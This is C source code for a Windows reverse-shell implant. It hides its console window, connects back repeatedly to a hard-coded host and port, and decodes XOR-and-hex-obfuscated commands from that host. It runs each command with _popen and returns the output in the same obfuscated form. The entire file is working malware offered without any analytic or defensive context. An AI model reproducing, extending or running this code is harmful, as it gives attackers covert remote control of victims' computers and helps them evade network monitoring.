#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

#define KEY 0x3A  // XOR encryption key

void XOR(char* data, size_t data_len) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= KEY;
    }
}

void HexEncode(const char* input, char* output) {
    const char hex[] = "0123456789ABCDEF";
    while (*input) {
        *output++ = hex[(*input >> 4) & 0xF];
        *output++ = hex[*input & 0xF];
        input++;
    }
    *output = '\0';
}

void HexDecode(const char* input, char* output) {
    char buf[3] = {0};
    while (*input && *(input + 1)) {
        buf[0] = *input++;
        buf[1] = *input++;
        *output++ = (char)strtol(buf, NULL, 16);
    }
    *output = '\0';
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    const char* host = "192.168.195.1";
    const int port = 1111;

    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;

    char recv_buf[2048], cmd_buf[2048], result[8192], hex_buf[16384];

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        return 1;

    while (1) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            Sleep(5000);
            continue;
        }

        server.sin_family = AF_INET;
        server.sin_port = htons(port);
        server.sin_addr.s_addr = inet_addr(host);

        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            closesocket(sock);
            Sleep(30000);
            continue;
        }

        while (1) {
            memset(recv_buf, 0, sizeof(recv_buf));
            memset(cmd_buf, 0, sizeof(cmd_buf));
            memset(result, 0, sizeof(result));
            memset(hex_buf, 0, sizeof(hex_buf));

            int bytes_recv = recv(sock, recv_buf, sizeof(recv_buf) - 1, 0);
            if (bytes_recv <= 0)
                break;

            HexDecode(recv_buf, cmd_buf);
            XOR(cmd_buf, strlen(cmd_buf));

            if (strcmp(cmd_buf, "exit") == 0)
                break;

            FILE* fp = _popen(cmd_buf, "r");
            if (!fp) {
                char err[] = "Command execution failed\r\n";
                XOR(err, strlen(err));
                HexEncode(err, hex_buf);
                send(sock, hex_buf, strlen(hex_buf), 0);
                continue;
            }

            size_t total_len = 0;
            char temp[1024];
            while (fgets(temp, sizeof(temp), fp)) {
                if (total_len + strlen(temp) >= sizeof(result) - 1)
                    break;
                strcat(result, temp);
                total_len += strlen(temp);
            }

            _pclose(fp);

            if (total_len == 0) {
                strcpy(result, "No output.\r\n");
                total_len = strlen(result);
            }

            XOR(result, total_len);
            HexEncode(result, hex_buf);
            send(sock, hex_buf, strlen(hex_buf), 0);
        }

        closesocket(sock);
        Sleep(10000);
    }

    WSACleanup();
    return 0;
}
